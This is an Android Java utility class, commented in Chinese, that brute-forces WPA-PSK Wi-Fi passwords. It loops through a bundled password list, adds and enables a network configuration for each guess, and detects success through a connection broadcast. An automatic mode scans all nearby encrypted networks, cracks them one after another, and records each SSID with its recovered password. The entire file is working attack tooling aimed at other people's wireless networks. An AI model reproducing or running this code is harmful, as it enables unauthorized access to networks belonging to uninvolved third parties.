package com.jhj.dev.wifi.server.util;

import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.view.View;

import com.jhj.dev.wifi.server.R;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

/**
 * @author 韩吉
 *         动态注册广播，在实例化的时候注册广播，不需要时解除注册
 */

public class BreakWifiUtil {

//    private TextView breakwificontent;
//    private ScrollView scrollView;
//    private ButtonFlat selectwifibt, startbreakwifibt, alreadyBreakbt;
//    private View breakwifiListView;
//    private CheckBox checkBox;
//    private ListView wifiListView;
//    private AlertDialog wifilistDialog;
//    private boolean isthread = true;   // 用于自动追踪文本，是否追踪文本到最后

    private ProgressDialog myProgressDialog;
    private boolean Btraking = false;  // 是否为正在破解WiFi
    private boolean isautomatic = false;  //是否为自动破解wifi

    private Handler handler;  // hendler统一处理消息内容
    private WifiInfo wifiInfo;

    private WifiConfiguration wifiConfiguration;
    private WifiManager wifiManager;
    private int i = 0, j = 0;
    private int netID, beforeId;
    public static Timer timer;
    private String[] password;
    private BreakWifiReceiver bReceiver;
    private String wifiName;
    private Message message;
    private List<Map<String, String>> breaksuccesslist = new ArrayList<>();

    private ArrayList<String> wifilistStrings = new ArrayList<>();

    private Thread thread;


    private int position = -1; // 选择wifi列表点击的第几项

    /**
     * 破解的时间间隔（ 毫秒）
     */
    private int BreakTime = 1500;

    /**
     * 准备破解的时间间隔（ 毫秒）
     */
    private int PrepareBreakTime = 2000;

    private View view;

    private Context context;

    public BreakWifiUtil(Context context) {

        this.context = context;

        Init();

        InitHandler();
    }

    /**
     * 初始化变量
     */

    private void Init() {
        // TODO Auto-generated method stub

        wifiManager = (WifiManager) context.getSystemService(
                Context.WIFI_SERVICE);

        password = context.getResources().getStringArray(
                R.array.passwords);
    }

    /**
     * handler 的初始化
     */
    @SuppressLint("HandlerLeak")
    private void InitHandler() {
        // TODO Auto-generated method stub

        handler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                // TODO Auto-generated method stub
                super.handleMessage(msg);

                if (msg.what == 2) {

                    if (!isautomatic) {

//                        breakwificontent.append("尝试密码结束" + "\n");

                        myProgressDialog.cancel();
                        createDialog("很抱歉，密码破解失败<-.->");
                        Btraking = false;
                        connectWifi();

                        UnregisterReceiver();  // 取消注册wifi状态广播

//                        startbreakwifibt.setEnabled(true);

                    } else {

                        j++;

                        PrepareBreakTime = 0;

//                        breakwificontent.append("尝试密码结束" + "\n");

                        myProgressDialog.cancel();

                        StartBreakWifiBtEvent(null);
                    }
                } else if (msg.what == 3) {

                    myProgressDialog
                            .setProgress((int) ((100.0 / password.length) * (i + 1)));
                }
            }
        };
    }

//    /**
//     * 监听函数
//     */
//    private void Setlistener() {
//        // TODO Auto-generated method stub
//
//        selectwifibt.setOnClickListener(new OnClickListener() { // wifi 选择事件响应
//
//            @Override
//            public void onClick(View v) {
//                // TODO Auto-generated method stub
//
//                CreateBreakWifiSelectDialog();  // 弹出选择信号弹出框
//            }
//        });
//
//        startbreakwifibt.setOnClickListener(new OnClickListener() { // wifi破解按钮
//
//            @Override
//            public void onClick(View v) {
//                // TODO Auto-generated method stub
//
//                InitBreakWifi();  // 调用wifi破解初始化函数
//            }
//        });
//
//        checkBox.setOncheckListener(new OnCheckListener() {
//
//            @Override
//            public void onCheck(boolean check) {
//                // TODO Auto-generated method stub
//
//                SetBreakWifiAutomatic(check);
//            }
//        });
//
//        alreadyBreakbt.setOnClickListener(new OnClickListener() {
//
//            @Override
//            public void onClick(View v) {
//                // TODO Auto-generated method stub
//                GetAlreadyBreakWifi();
//            }
//        });
//    }

//    /**
//     * 创建wifi破解选择信号弹出框
//     */
//    private void CreateBreakWifiSelectDialog() {
//        wifiManager.startScan();  //开始扫描周边wifi
//        wifilistStrings = WifiToArrayList(wifiManager
//                .getScanResults());  // 获取周边WiFi信息列表
//
//        creatListDialog(wifilistStrings);  // 创建wiif列表弹出框
//    }

    /**
     * 显示已经破解成功的wifi列表
     */
    private void GetAlreadyBreakWifi() {

        if (breaksuccesslist.size() != 0) {

            createDialog("已成功破解下列WiFi：\n"+BreakSuccessListToString(breaksuccesslist));
        } else {

            createDialog("很抱歉，未破解成功");
        }
    }

    /**
     * 初始化wifi破解，直接调用此函数执行wifi破解
     *
     * @param WifiSsid    传入的需要破解的wifi名称，若为自动破解则传入null
     * @param isautomatic 是否为自动破解，自动破解名称传入null
     */
    public void InitBreakWifi(String WifiSsid, boolean isautomatic) {

        this.isautomatic = isautomatic;

        RegisterBroadcast(); // 注册广播

        if (isConnected()) { // 若已链接WiFi则断开wifi

            disconnectWifi();
        }

        System.out.println(isautomatic);

        if (!isautomatic) {

//            InitThread();

            StartBreakWifiBtEvent(WifiSsid);
        } else {

//            InitThread();

            breaksuccesslist.clear(); // 清除之前列表中的数据
            wifiManager.startScan();

            wifilistStrings = WifiToArrayList(wifiManager
                    .getScanResults());

            StartBreakWifiBtEvent(null);
        }
    }

//    /**
//     * 设置是否为自动破解wifi，从扫描到的wifi中逐个尝试密码
//     *
//     * @param check
//     */
//    public void SetBreakWifiAutomatic(boolean check) {
//
//        isautomatic = check;
//    }

//    /**
//     * 初始化线程，该线程用于文本自动追踪到底部，文本行数过多时会自动追踪到最后，方便观察
//     */
//    private void InitThread() {
//
//        isthread = true;
//
//        thread = new Thread(new Runnable() { // textview自动追踪到底部
//
//            @SuppressWarnings("static-access")
//            @Override
//            public void run() {
//                // TODO Auto-generated method stub
//                while (isthread) {
//                    if (scrollView == null || breakwificontent == null) {
//                        return;
//                    }
//                    // 内层高度超过外层
//                    int offset = breakwificontent.getMeasuredHeight()
//                            - scrollView.getMeasuredHeight();
//                    if (offset < 0) {
//
//                        offset = 0;
//                    }
//                    scrollView.scrollTo(0, offset);
//
//                    try {
//
//                        thread.sleep(BreakTime);
//                    } catch (Exception e) {
//                        // TODO Auto-generated catch block
//                        e.printStackTrace();
//                    }
//                }
//            }
//        });
//
//        thread.start();
//    }

    /**
     * 开始破解的点击事件内容
     */
    private void StartBreakWifiBtEvent(String WifiSsis) {

        if (!isautomatic) {

            wifiName = WifiSsis;

        } else {

            try {

                wifiName = nameToString(wifilistStrings.get(j));
            } catch (Exception e) {
                // TODO Auto-generated catch block

                wifiName = null;
            }
        }

        if (wifiName != null) {

            if (!wifiManager.isWifiEnabled()) {  //wifi未开启则开启wifi
                wifiManager.setWifiEnabled(true);
            }

//            if (!isautomatic) {
//                startbreakwifibt.setEnabled(false);
//            }

            i = 0;
            timer = new Timer();
            Log.d("Mylog", "开始破解----------------->" + wifiName);

//            breakwificontent.append("开始破解----------------->" + wifiName + "\n");

            createProgressDialog();

            timer.schedule(new TimerTask() {

                @Override
                public void run() {
                    // TODO Auto-generated method stub
                    BreakingCode(wifiName);

                    if (!Btraking) {
                        Btraking = true;
                    }
                }
            }, PrepareBreakTime, BreakTime);
        } else {

            j = 0;
            PrepareBreakTime = 2000;

//            createDialog("自动破解循环结束");

            GetAlreadyBreakWifi();

            connectWifi();

            UnregisterReceiver();
        }
    }

    /**
     * 断开当前WiFi连接
     */
    private void disconnectWifi() {

        wifiInfo = wifiManager.getConnectionInfo();
        beforeId = wifiInfo.getNetworkId();
        wifiManager.disableNetwork(beforeId);
    }

    /**
     * 链接wifi
     */
    private void connectWifi() {

        if (beforeId != 0) {
            wifiManager.enableNetwork(beforeId, true);
        }
    }

    /**
     * 判断wifi连接状态
     *
     * @return
     */
    private boolean isConnected() {

        ConnectivityManager connManager =
                (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        return mWifi.isConnected();
    }

    /**
     * 将存储破解成功的WiFi密码链表转换成字符串，方便显示
     *
     * @param list
     * @return 已破解的wifi字符串
     */
    private String BreakSuccessListToString(List<Map<String, String>> list) {

        String listString = "";

        for (Map<String, String> map : list) {
            listString = listString + "SSID    :"
                    + nameToString(map.get("ssid")) + "\nPassword:"
                    + map.get("password") + "\n";
        }

        return listString;
    }

    /**
     * @param name
     * @return 截取wifi名称的ssid
     */
    private String nameToString(String name) {

        String[] namesStrings = name.split("（");
        return namesStrings[0];
    }

    /**
     * @param wifiname wifi链接破解
     */
    private void BreakingCode(String wifiname) {

        if (netID != 0) {
            wifiManager.removeNetwork(netID);
        }

        Log.d("Mylog", "尝试密码：------>" + password[i]);

        message = new Message();
        message.what = 3;
        handler.sendMessage(message);

        wifiConfiguration = new WifiConfiguration();
        wifiConfiguration.SSID = "\"" + wifiname + "\""; // 指定ssid
        wifiConfiguration.preSharedKey = "\"" + password[i] + "\""; // 指定密码
        wifiConfiguration.hiddenSSID = true;
        wifiConfiguration.allowedKeyManagement
                .set(WifiConfiguration.KeyMgmt.WPA_PSK);
        wifiConfiguration.status = WifiConfiguration.Status.ENABLED;
        netID = wifiManager.addNetwork(wifiConfiguration);
        wifiManager.enableNetwork(netID, true);
        if (i == password.length - 1) {

            message = new Message();
            message.what = 2;
            handler.sendMessage(message);

            timer.cancel();
        }
        i++;
    }

//    /**
//     * @param list 创建Listwifi列表项dialog弹出框
//     */
//    private void creatListDialog(ArrayList<String> list) {
//
//        breakwifiListView = getActivity().getLayoutInflater().inflate(
//                R.layout.layout_listview, null);
//
//        wifiListView = (ListView) breakwifiListView
//                .findViewById(R.id.myListview);
//
//        ArrayAdapter<String> adapter = new ArrayAdapter<>(getActivity(),
//                android.R.layout.simple_list_item_1, list);
//        wifiListView.setAdapter(adapter);
//
//        wifilistDialog = new AlertDialog.Builder(getActivity())
//                .setTitle("请选择需要破解的WiFi").setView(breakwifiListView)
//                .setNegativeButton("取消", new DialogInterface.OnClickListener() {
//
//                    @Override
//                    public void onClick(DialogInterface dialog, int which) {
//                        // TODO Auto-generated method stub
//
//                        selectwifibt.setText("请选择wifi信号");
//
//                        position = -1;
//                        connectWifi();
//                    }
//                }).create();
//        wifilistDialog.show();
//
//        listviewListener();
//    }

    /**
     * @param message 创建dialog弹出框
     */
    private void createDialog(String message) {

        new AlertDialog.Builder(context).setMessage(message)
                .setPositiveButton("确定", null).create().show();

//        isthread = false;
    }

    /**
     * 创建 破解进度条对话框
     */
    private void createProgressDialog() {
        myProgressDialog = new ProgressDialog(context);
        // 实例化
        myProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
        // 设置进度条风格，风格为长形，有刻度的
        myProgressDialog.setMessage("正在破解:" + wifiName);
        // 设置ProgressDialog 提示信息

        myProgressDialog.setMax(100);

        myProgressDialog.setButton(DialogInterface.BUTTON_NEGATIVE, "取消",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        // TODO Auto-generated method stub

                        PrepareBreakTime = 2000;

                        Btraking = false;
                        myProgressDialog.cancel();
                        timer.cancel();
                        i = 0;

//                        startbreakwifibt.setEnabled(true);

                        if (isautomatic) {

                            if (j>0) {  // 判断是否为第一个，第一个则不弹出wifi列表
                                GetAlreadyBreakWifi();
                            }

                            j = 0;
                        }

//                        isthread = false;

                        connectWifi();
                    }
                });

        myProgressDialog.setIndeterminate(false);
        // 设置ProgressDialog 的进度条是否不明确
        myProgressDialog.setCancelable(false);
        // 设置ProgressDialog 是否可以按退回按键取消
        myProgressDialog.show();
        // 让ProgressDialog显示
    }

//    /**
//     * 弹出框listview的事件响应
//     */
//    private void listviewListener() {
//        wifiListView.setOnItemClickListener(new OnItemClickListener() {
//
//            @Override
//            public void onItemClick(AdapterView<?> parent, View view,
//                                    int position, long id) {
//                // TODO Auto-generated method stub
//                Log.d("Mylog", wifilistStrings.get(position));
//
//                selectwifibt.setText(wifilistStrings.get(position));
//                BreakWifiUtil.this.position = position;
//                wifilistDialog.cancel();
//            }
//        });
//    }

    /**
     * @param list
     * @return 将wifi扫描到的list集合转换成字符串集合
     */
    private ArrayList<String> WifiToArrayList(List<ScanResult> list) {

        ArrayList<String> wifilist = new ArrayList<>();

        for (ScanResult scanResult : list) {
            if (scanResult.capabilities.length() > 10) { // 去除开放的ssid，开放的加密方式字符长度小于10
                wifilist.add(scanResult.SSID + "（" + scanResult.BSSID + "）");
            }
        }

        return wifilist;
    }


    /**
     * @author Administrator wifi破解广播
     */
    private class BreakWifiReceiver
            extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            // TODO Auto-generated method stub

            if (intent.getAction().equals("android.net.wifi.STATE_CHANGE")
                    && Btraking) {
                Log.d("Mylog", "-----" + intent.toString());
                Btraking = false;
                timer.cancel();

//                breakwificontent.append("破解成功:密码为" + password[i - 1] + "\n");

                myProgressDialog.cancel();

//                startbreakwifibt.setEnabled(true);

                if (!isautomatic) {

                    createDialog("破解成功:密码为" + password[i - 1]);
                } else {

                    Map<String, String> map = new HashMap<>();
                    map.put("ssid", wifilistStrings.get(j));
                    map.put("password", password[i - 1]);

                    PrepareBreakTime = 1000; // 破解成功 停留1秒

                    breaksuccesslist.add(map); // 存储破解成功的密码
                    j++;

                    StartBreakWifiBtEvent(null);
                }
            }
        }
    }

    /**
     * 注册广播
     */
    private void RegisterBroadcast() {
        // TODO Auto-generated method stub
        IntentFilter iFilter = new IntentFilter();
        iFilter.addAction("android.net.wifi.STATE_CHANGE");
        iFilter.setPriority(999);
        bReceiver = new BreakWifiReceiver();
        context.registerReceiver(bReceiver, iFilter);
    }

    /**
     * 取消广播的注册
     */
    private void UnregisterReceiver() {

        context.unregisterReceiver(bReceiver);

        connectWifi();
    }
}